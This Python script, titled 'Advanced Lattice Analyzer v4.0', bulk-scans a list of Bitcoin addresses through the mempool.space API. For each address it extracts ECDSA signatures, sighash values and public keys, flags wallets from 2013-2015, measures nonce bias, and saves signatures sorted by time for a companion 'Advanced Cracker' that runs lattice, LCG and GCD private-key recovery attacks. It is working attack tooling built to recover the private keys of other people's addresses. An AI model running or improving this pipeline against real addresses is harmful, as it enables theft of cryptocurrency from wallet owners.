import requests, time, os, sys, signal, json, re, hashlib
from typing import List, Dict, Any, Optional, Tuple
from collections import defaultdict, Counter

# ==============================================================================
# CONFIG & GLOBALS  (ADVANCED EDITION)
# ==============================================================================
MEMPOOL_API_TXS = "https://mempool.space/api/address/{address}/txs?limit={limit}&offset={offset}"
BATCH_SIZE = 25
REQ_TIMEOUT = 20
MAX_RETRIES = 10
MAX_TRANSACTIONS = 0

EXIT_FLAG = False
STARTED_SCANNING = False
SESSION = requests.Session()
SESSION.headers.update({"User-Agent": "AdvancedLatticeAnalyzer/4.0"})

# Lowered from 7 to 4: advanced attacks (LCG, GCD) can work with fewer sigs
MIN_SIGS_REQUIRED = 4
FINGERPRINTS_FOUND: Dict[str, set] = defaultdict(set)

# ==============================================================================
# SYSTEM FUNCTIONS
# ==============================================================================
def signal_handler(sig, frame):
    global EXIT_FLAG
    if not STARTED_SCANNING:
        print("\n\n[!] Exiting...")
        sys.exit(0)
    print("\n\n[!] Force Stop Detected!")
    EXIT_FLAG = True

signal.signal(signal.SIGINT, signal_handler)

def backoff_sleep(attempt: int):
    delay = min(2 ** attempt * 3, 120)
    time.sleep(delay)

def calc_ripemd160(data: bytes) -> bytes:
    try:
        return hashlib.new('ripemd160', data).digest()
    except ValueError:
        from Crypto.Hash import RIPEMD160
        return RIPEMD160.new(data=data).digest()

# ==============================================================================
# ADDRESS VALIDATION
# ==============================================================================
B58_CHARS = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'

def b58decode(s: str) -> bytes:
    n = 0
    for c in s:
        if c not in B58_CHARS:
            raise ValueError("Invalid Base58 char")
        n = n * 58 + B58_CHARS.index(c)
    res = n.to_bytes((n.bit_length() + 7) // 8 or 1, 'big')
    pad = 0
    for c in s:
        if c == '1': pad += 1
        else: break
    return b'\x00' * pad + res.lstrip(b'\x00')

def validate_btc_address(addr: str) -> bool:
    """Validate Base58Check or Bech32 address format."""
    addr = addr.strip()
    if not addr:
        return False
    # Bech32/Bech32m (bc1...)
    if addr.lower().startswith("bc1"):
        return len(addr) >= 14 and len(addr) <= 90
    # Base58Check (1... or 3...)
    if addr[0] in ('1', '3'):
        try:
            raw = b58decode(addr)
            if len(raw) != 25: return False
            payload, checksum = raw[:21], raw[21:]
            return hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4] == checksum
        except Exception:
            return False
    return False

# ==============================================================================
# MEMPOOL PARSING
# ==============================================================================
def get_total_transactions(address: str) -> Optional[int]:
    attempts = 0
    while attempts < MAX_RETRIES and not EXIT_FLAG:
        try:
            url = f"https://mempool.space/api/address/{address}"
            r = SESSION.get(url, timeout=REQ_TIMEOUT)
            if r.status_code == 200:
                return r.json().get("chain_stats", {}).get("tx_count", 0)
            elif r.status_code == 429:
                attempts += 1
                backoff_sleep(attempts)
            else:
                attempts += 1
                time.sleep(2)
        except Exception:
            attempts += 1
            time.sleep(2)
    return None

def fetch_transactions_batch(address: str, offset: int, limit: int) -> Optional[List[dict]]:
    attempts = 0
    while attempts < MAX_RETRIES and not EXIT_FLAG:
        try:
            url = MEMPOOL_API_TXS.format(address=address, offset=offset, limit=limit)
            r = SESSION.get(url, timeout=REQ_TIMEOUT)
            if r.status_code == 200:
                return r.json()
            elif r.status_code in (429, 500, 502, 503, 504):
                attempts += 1
                backoff_sleep(attempts)
            else:
                attempts += 1
                time.sleep(2)
        except Exception:
            attempts += 1
            time.sleep(2)
    return None

def fetch_all_transactions(address: str) -> List[dict]:
    total = get_total_transactions(address)
    if not total or total <= 0: return []
    
    total_to_fetch = min(total, MAX_TRANSACTIONS) if MAX_TRANSACTIONS > 0 else total
    out = []
    offset = 0
    
    print(f"  -> Fetching {total_to_fetch} transactions...")
    while offset < total_to_fetch and not EXIT_FLAG:
        size = min(BATCH_SIZE, total_to_fetch - offset)
        batch = fetch_transactions_batch(address, offset, size)
        if batch is None: break
        if not batch: break
        out.extend(batch)
        offset += len(batch)
        # Progress indicator
        pct = min(100, int(offset / total_to_fetch * 100))
        print(f"\r  -> Fetched {offset}/{total_to_fetch} ({pct}%)", end="", flush=True)
        if offset < total_to_fetch:
            time.sleep(1.5)
    
    print()  # newline after progress
    return out

# ==============================================================================
# SIGHASH / PREIMAGE EXTRACTION
# ==============================================================================
def varint(n: int) -> bytes:
    if n < 0xfd: return n.to_bytes(1, 'little')
    elif n <= 0xffff: return b'\xfd' + n.to_bytes(2, 'little')
    elif n <= 0xffffffff: return b'\xfe' + n.to_bytes(4, 'little')
    else: return b'\xff' + n.to_bytes(8, 'little')

def compute_legacy_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    if sighash_flag != 1: return None
    try:
        from hashlib import sha256
        def dsha(b): return sha256(sha256(b).digest()).digest()

        version = int(tx.get("version", 1))
        locktime = int(tx.get("locktime", 0))
        ser = version.to_bytes(4, "little")

        vins = tx.get("vin", [])
        ser += varint(len(vins))
        for i, inp in enumerate(vins):
            prev_txid = bytes.fromhex(inp.get("txid", ""))[::-1]
            vout_n = int(inp.get("vout", 0))
            ser += prev_txid + vout_n.to_bytes(4, "little")
            if i == vin_idx:
                script_pubkey = (inp.get("prevout") or {}).get("scriptpubkey", "")
                script_bytes = bytes.fromhex(script_pubkey)
                ser += varint(len(script_bytes)) + script_bytes
            else:
                ser += b"\x00"
            ser += int(inp.get("sequence", 0xffffffff)).to_bytes(4, "little")

        vouts = tx.get("vout", [])
        ser += varint(len(vouts))
        for out in vouts:
            ser += int(out.get("value", 0)).to_bytes(8, "little")
            script_bytes = bytes.fromhex(out.get("scriptpubkey", ""))
            ser += varint(len(script_bytes)) + script_bytes

        ser += locktime.to_bytes(4, "little") + sighash_flag.to_bytes(4, "little")
        return int.from_bytes(dsha(ser), "big")
    except Exception: return None

def compute_bip143_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    if sighash_flag != 1: return None
    try:
        from hashlib import sha256
        def dsha(b): return sha256(sha256(b).digest()).digest()

        vins = tx.get("vin", [])
        txin = vins[vin_idx]
        prevout = txin.get("prevout") or {}
        
        version = int(tx.get("version", 2))
        locktime = int(tx.get("locktime", 0))

        prevouts_ser = b"".join([bytes.fromhex(inp.get("txid", ""))[::-1] + int(inp.get("vout", 0)).to_bytes(4, "little") for inp in vins])
        hashPrevouts = dsha(prevouts_ser)

        sequences_ser = b"".join([int(inp.get("sequence", 0xffffffff)).to_bytes(4, "little") for inp in vins])
        hashSequence = dsha(sequences_ser)

        outputs_ser = b"".join([int(out.get("value", 0)).to_bytes(8, "little") + varint(len(bytes.fromhex(out.get("scriptpubkey", "")))) + bytes.fromhex(out.get("scriptpubkey", "")) for out in tx.get("vout", [])])
        hashOutputs = dsha(outputs_ser)

        outpoint = bytes.fromhex(txin.get("txid", ""))[::-1] + int(txin.get("vout", 0)).to_bytes(4, "little")

        hash160 = b""
        spk_bytes = bytes.fromhex(prevout.get("scriptpubkey", ""))

        if len(spk_bytes) == 22 and spk_bytes[:2] == b'\x00\x14': hash160 = spk_bytes[2:]
        elif len(spk_bytes) == 23 and spk_bytes[:2] == b'\xa9\x14':
             scriptsig = txin.get("scriptsig", "")
             if isinstance(scriptsig, dict): scriptsig = scriptsig.get("hex", "")
             if len(scriptsig) == 46:
                 redeem = bytes.fromhex(scriptsig[2:])
                 if len(redeem) == 22 and redeem[:2] == b'\x00\x14': hash160 = redeem[2:]
             
        if not hash160:
             witness = txin.get("witness", [])
             if len(witness) == 2:
                 hash160 = calc_ripemd160(hashlib.sha256(bytes.fromhex(witness[1])).digest())

        if not hash160: return None

        scriptCode = varint(len(b"\x76\xa9\x14" + hash160 + b"\x88\xac")) + b"\x76\xa9\x14" + hash160 + b"\x88\xac"
        value = int(prevout.get("value", 0)).to_bytes(8, "little")
        sequence = int(txin.get("sequence", 0xffffffff)).to_bytes(4, "little")

        preimage = (version.to_bytes(4, "little") + hashPrevouts + hashSequence + outpoint + scriptCode + value + sequence + hashOutputs + locktime.to_bytes(4, "little") + sighash_flag.to_bytes(4, "little"))
        return int.from_bytes(dsha(preimage), "big")
    except Exception: return None

def compute_sighash_z(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    vins = tx.get("vin", [])
    if vin_idx >= len(vins): return None
    prevout = vins[vin_idx].get("prevout") or {}
    input_type = prevout.get("scriptpubkey_type", prevout.get("type", "unknown"))
    if input_type in ["v0_p2wpkh", "p2wpkh", "p2sh-p2wpkh", "witness_v0_keyhash"]:
        return compute_bip143_sighash(tx, vin_idx, sighash_flag)
    elif input_type in ["p2pkh", "pubkeyhash"]:
        return compute_legacy_sighash(tx, vin_idx, sighash_flag)
    return None

def parse_der_sig(sig_hex: str) -> Optional[Tuple[int, int, int]]:
    try:
        hex_str = sig_hex.lower()
        idx = hex_str.find("30")
        while idx != -1:
            try:
                i0 = idx + 2
                seq_len = int(hex_str[i0:i0+2], 16); i0 += 2
                if hex_str[i0:i0+2] != "02":
                    idx = hex_str.find("30", idx + 2)
                    continue
                i0 += 2
                r_len = int(hex_str[i0:i0+2], 16); i0 += 2
                r_hex = hex_str[i0:i0 + 2*r_len]; i0 += 2*r_len
                if hex_str[i0:i0+2] != "02":
                    idx = hex_str.find("30", idx + 2)
                    continue
                i0 += 2
                s_len = int(hex_str[i0:i0+2], 16); i0 += 2
                s_hex = hex_str[i0:i0 + 2*s_len]; i0 += 2*s_len
                if seq_len != 2 + r_len + 2 + s_len or i0 > len(hex_str):
                    idx = hex_str.find("30", idx + 2)
                    continue
                sighash_flag = int(hex_str[i0:i0+2], 16) if i0 + 2 <= len(hex_str) else 1
                return (int(r_hex, 16), int(s_hex, 16), sighash_flag)
            except Exception:
                idx = hex_str.find("30", idx + 2)
        return None
    except Exception: return None

def extract_pubkey_from_scriptsig(script_hex: str) -> Optional[str]:
    if not script_hex: return None
    hexstr = script_hex.lower()
    match = re.search(r'(?:^|[0-9a-f]{2})41(04[0-9a-f]{128})$', hexstr)
    if match: return match.group(1)
    match = re.search(r'(?:^|[0-9a-f]{2})21((?:02|03)[0-9a-f]{64})$', hexstr)
    if match: return match.group(1)
    cands = re.findall(r'41(04[0-9a-f]{128})', hexstr) + re.findall(r'21((?:02|03)[0-9a-f]{64})', hexstr)
    if cands: return cands[-1]
    return None

# ==============================================================================
# SENDER-ONLY FILTERING
# ==============================================================================
def address_from_scriptpubkey(spk_hex: str, spk_type: str) -> Optional[str]:
    """Derive the Bitcoin address from a scriptPubKey (used to check if input belongs to our target)."""
    try:
        spk = bytes.fromhex(spk_hex)
        if spk_type in ("p2pkh", "pubkeyhash"):
            # OP_DUP OP_HASH160 <20 bytes> OP_EQUALVERIFY OP_CHECKSIG
            if len(spk) == 25:
                payload = b'\x00' + spk[3:23]
                checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
                return b58encode(payload + checksum)
        elif spk_type in ("p2sh", "scripthash"):
            if len(spk) == 23:
                payload = b'\x05' + spk[2:22]
                checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
                return b58encode(payload + checksum)
        elif spk_type in ("v0_p2wpkh", "witness_v0_keyhash"):
            # bech32 - just return the address from the API prevout
            return None  # Let caller use prevout.address
    except Exception:
        pass
    return None

def b58encode(data: bytes) -> str:
    n = int.from_bytes(data, 'big')
    chars = []
    while n > 0:
        n, r = divmod(n, 58)
        chars.append(B58_CHARS[r])
    # leading zeros
    for b in data:
        if b == 0: chars.append('1')
        else: break
    return ''.join(reversed(chars))

def is_input_from_address(txin: dict, target_address: str) -> bool:
    """Check if this transaction input was spent FROM our target address."""
    prevout = txin.get("prevout") or {}
    # The API conveniently provides the address in prevout
    prevout_addr = prevout.get("scriptpubkey_address", "")
    if prevout_addr == target_address:
        return True
    # Fallback: derive from scriptpubkey
    spk_hex = prevout.get("scriptpubkey", "")
    spk_type = prevout.get("scriptpubkey_type", "")
    derived = address_from_scriptpubkey(spk_hex, spk_type)
    if derived and derived == target_address:
        return True
    return False

# ==============================================================================
# ANALYSIS LOGIC & FINGERPRINTING
# ==============================================================================
def detect_historic_fingerprints(tx: dict) -> List[str]:
    fingerprints = []
    
    fee = tx.get("fee", 0)
    status = tx.get("status", {})
    block_height = status.get("block_height", 9999999)
    version = int(tx.get("version", 1))
    locktime = int(tx.get("locktime", 0))
    
    # 1. The 2013-2015 Danger Zone (Blocks 250,000 to 400,000)
    if status.get("confirmed", False) and 250000 <= block_height <= 400000:
        fingerprints.append("[CRITICAL] 2013-2015 Danger Zone Timestamp")
        
    # 2. Hardcoded Wallet Fees (Common in buggy early wallets)
    if fee in [10000, 50000, 100000]:
        fingerprints.append(f"[WARNING] Suspicious Hardcoded Fee ({fee} sats)")
    
    # 3. Very old transaction version
    if version == 1:
        fingerprints.append("[INFO] Version 1 Transaction")
    
    # 4. Unusual nLockTime (some old wallets set locktime to block height)
    if locktime > 0 and locktime < 500000:
        fingerprints.append(f"[INFO] Non-zero nLockTime ({locktime})")
        
    # 5. Unusual sequence numbers (old wallets often used 0xFFFFFFFF)
    for inp in tx.get("vin", []):
        seq = int(inp.get("sequence", 0xFFFFFFFF))
        if seq == 0:
            fingerprints.append("[WARNING] Zero Sequence Number (very unusual)")
            break
    
    # 6. SegWit Check
    is_legacy = True
    for inp in tx.get("vin", []):
        itype = (inp.get("prevout") or {}).get("scriptpubkey_type", "")
        if "wpkh" in itype or "taproot" in itype:
            is_legacy = False
            
    if is_legacy:
        fingerprints.append("[INFO] Standard Legacy P2PKH Pattern")
        
    return fingerprints

def analyze_address(address: str):
    print(f"\n[*] Scanning: {address}")
    txs = fetch_all_transactions(address)
    
    unique_sigs_by_pubkey = defaultdict(dict)
    pubkey_counter = Counter()
    sig_count = 0
    # Global chronological order counter for signature ordering
    sig_order_counter = 0
    
    for tx_idx, tx in enumerate(txs):
        # Extract block_height for chronological ordering (critical for LCG attack)
        tx_status = tx.get("status", {})
        block_height = tx_status.get("block_height", 9999999)
        
        for vin_idx, txin in enumerate(tx.get("vin", [])):
            # Only extract signatures from inputs belonging to OUR target address
            if not is_input_from_address(txin, address):
                continue
            
            parsed = pubkey = None
            witness = txin.get("witness", [])
            
            if witness and len(witness) >= 2:
                pubkey = witness[1] if len(witness[1]) in (66, 130) else None
                parsed = parse_der_sig(witness[0])
            
            if not pubkey or not parsed:
                scriptsig = txin.get("scriptsig", {})
                script_hex = scriptsig.get("hex", "") if isinstance(scriptsig, dict) else txin.get("scriptsig", "")
                if script_hex:
                    pubkey = pubkey or extract_pubkey_from_scriptsig(script_hex)
                    parsed = parsed or parse_der_sig(script_hex)
            
            if not parsed or not pubkey: continue
            
            r, s, sighash_flag = parsed
            z = compute_sighash_z(tx, vin_idx, sighash_flag)
            
            if z is not None:
                pubkey_lower = pubkey.lower()
                
                # Check for historic footprints
                tx_fingerprints = detect_historic_fingerprints(tx)
                for f in tx_fingerprints:
                    FINGERPRINTS_FOUND[address].add(f)
                    
                key = (r, s, z)
                if key not in unique_sigs_by_pubkey[pubkey_lower]:
                    unique_sigs_by_pubkey[pubkey_lower][key] = {
                        "r": hex(r), "s": hex(s), "z": hex(z),
                        "txid": tx.get("txid", ""),
                        # NEW: Chronological metadata for LCG / Sequential attacks
                        "block_height": block_height,
                        "sig_order": sig_order_counter,
                        "vin_idx": vin_idx,
                    }
                    sig_order_counter += 1
                    sig_count += 1
                    pubkey_counter[pubkey_lower] += 1
        
        # Progress indicator every 50 transactions
        if (tx_idx + 1) % 50 == 0:
            print(f"\r  -> Processing tx {tx_idx+1}/{len(txs)}, sigs found: {sig_count}", end="", flush=True)
    
    if len(pubkey_counter) >= 50:
        print()  # newline after progress
    
    # Use the MOST FREQUENT pubkey
    if pubkey_counter:
        primary_pubkey = pubkey_counter.most_common(1)[0][0]
        unique_sigs = unique_sigs_by_pubkey[primary_pubkey]
    else:
        primary_pubkey = "Unknown"
        unique_sigs = {}
                
    print(f"  -> Extracted {len(unique_sigs)} signatures for primary pubkey (from {len(pubkey_counter)} unique pubkeys).")
    
    if len(pubkey_counter) > 1:
        top = pubkey_counter.most_common(1)[0]
        print(f"  -> [WARNING] Multiple pubkeys detected! Using most frequent ({top[1]} sigs).")

    # ===== SORT SIGNATURES CHRONOLOGICALLY (critical for LCG Phantom attack) =====
    sig_list = list(unique_sigs.values())
    sig_list.sort(key=lambda x: (x.get("block_height", 9999999), x.get("sig_order", 0)))
    
    # ===== NONCE BIAS PRE-ANALYSIS (helps Filtered Lattice + Signature Filtering) =====
    bias_stats = []
    for sig in sig_list:
        r_val = int(sig['r'], 16)
        s_val = int(sig['s'], 16)
        r_bits = r_val.bit_length()
        s_bits = s_val.bit_length()
        r_hex = hex(r_val)[2:].zfill(64)
        leading_zeros = len(r_hex) - len(r_hex.lstrip('0'))
        bias_stats.append({
            "r_bits": r_bits, "s_bits": s_bits, "r_leading_zeros": leading_zeros,
        })
    
    # Summary stats
    if bias_stats:
        avg_r_bits = sum(b["r_bits"] for b in bias_stats) / len(bias_stats)
        min_r_bits = min(b["r_bits"] for b in bias_stats)
        max_leading_zeros = max(b["r_leading_zeros"] for b in bias_stats)
        low_r_count = sum(1 for b in bias_stats if b["r_bits"] < 248)
    else:
        avg_r_bits = min_r_bits = max_leading_zeros = low_r_count = 0

    # Prepare Save — use script directory for reports
    _script_dir = os.path.dirname(os.path.abspath(__file__))
    os.makedirs(os.path.join(_script_dir, "reports", "pass"), exist_ok=True)
    os.makedirs(os.path.join(_script_dir, "reports", "fail"), exist_ok=True)
    
    fingerprints_list = list(FINGERPRINTS_FOUND.get(address, set()))
    data = {
        "address": address,
        "pubkey": primary_pubkey,
        "historic_fingerprints": fingerprints_list,
        "signature_count": len(sig_list),
        "signatures": sig_list,  # Chronologically sorted!
        # NEW: Bias pre-analysis summary for the cracker
        "bias_stats": {
            "avg_r_bits": round(avg_r_bits, 1),
            "min_r_bits": min_r_bits,
            "max_r_leading_zeros": max_leading_zeros,
            "low_r_count": low_r_count,
            "chronologically_sorted": True,
        }
    }
    
    if fingerprints_list:
        print(f"  -> Historic Fingerprints: {', '.join(fingerprints_list)}")
    
    # Bias warning
    if low_r_count > 0:
        print(f"  -> [BIAS] {low_r_count} sigs with small r (<248 bits), min r_bits={min_r_bits}")
    
    if len(sig_list) >= MIN_SIGS_REQUIRED:
        filepath = os.path.join(_script_dir, "reports", "pass", f"{address}.json")
        with open(filepath, "w") as f:
            json.dump(data, f, indent=4)
        print(f"  [+] PASSED: {len(sig_list)} signatures (min: {MIN_SIGS_REQUIRED}) [chronologically sorted]")
        print(f"  -> Saved: {filepath}")
    else:
        print(f"  [-] SKIPPED: Only {len(sig_list)} signatures (need {MIN_SIGS_REQUIRED})")

# ==============================================================================
# MAIN
# ==============================================================================
def main():
    global MAX_TRANSACTIONS
    print("===================================================================")
    print("    ADVANCED LATTICE ANALYZER v4.0 (for Advanced Cracker v2.0)     ")
    print("    Chronological ordering | Bias pre-analysis | Min 4 sigs       ")
    print("===================================================================")
    
    while True:
        addr_file = input("Enter path to BTC addresses file: ").strip().replace('"', '').replace("'", "")
        if os.path.isfile(addr_file): break
        print("File not found! Try again.")
        
    while True:
        try:
            MAX_TRANSACTIONS = int(input("Max transactions per address (0 = no limit): ").strip())
            break
        except ValueError:
            print("Invalid number.")

    with open(addr_file, "r", encoding="utf-8") as f:
        raw_addresses = [ln.strip() for ln in f if ln.strip()]
    
    # Deduplicate addresses
    seen = set()
    addresses = []
    for a in raw_addresses:
        if a not in seen:
            seen.add(a)
            addresses.append(a)
    
    if len(raw_addresses) != len(addresses):
        print(f"  -> Removed {len(raw_addresses) - len(addresses)} duplicate addresses.")
    
    # Validate addresses
    valid_addresses = []
    invalid_count = 0
    for a in addresses:
        if validate_btc_address(a):
            valid_addresses.append(a)
        else:
            print(f"  [!] Invalid address skipped: {a}")
            invalid_count += 1
    
    if invalid_count > 0:
        print(f"  -> Skipped {invalid_count} invalid addresses.")
    
    _sd = os.path.dirname(os.path.abspath(__file__))
    _pass_dir = os.path.join(_sd, "reports", "pass")
    already_done = set()
    if os.path.isdir(_pass_dir):
        for f in os.listdir(_pass_dir):
            if f.endswith(".json"):
                already_done.add(f.replace(".json", ""))
    
    remaining = [a for a in valid_addresses if a not in already_done]
    if len(valid_addresses) != len(remaining):
        print(f"  -> Resuming: Skipping {len(valid_addresses) - len(remaining)} already-scanned addresses.")
    
    print(f"\n[*] Scanning {len(remaining)} addresses ({len(valid_addresses)} valid, {len(already_done)} already done).")

    global STARTED_SCANNING
    STARTED_SCANNING = True

    for idx, addr in enumerate(remaining):
        if EXIT_FLAG: break
        print(f"\n--- [{idx+1}/{len(remaining)}] ---")
        analyze_address(addr)

    print("\n" + "="*60)
    print("ADVANCED ANALYSIS COMPLETE!")
    
    pass_count = len([f for f in os.listdir(_pass_dir) if f.endswith(".json")]) if os.path.isdir(_pass_dir) else 0
    
    print(f"Results: {pass_count} PASSED (min {MIN_SIGS_REQUIRED} sigs)")
    print("Signatures are CHRONOLOGICALLY SORTED for LCG/Sequential detection.")
    print("Run: sage advanced_attacks/advanced_cracker.sage.py")
    print("="*60)

if __name__ == "__main__":
    main()
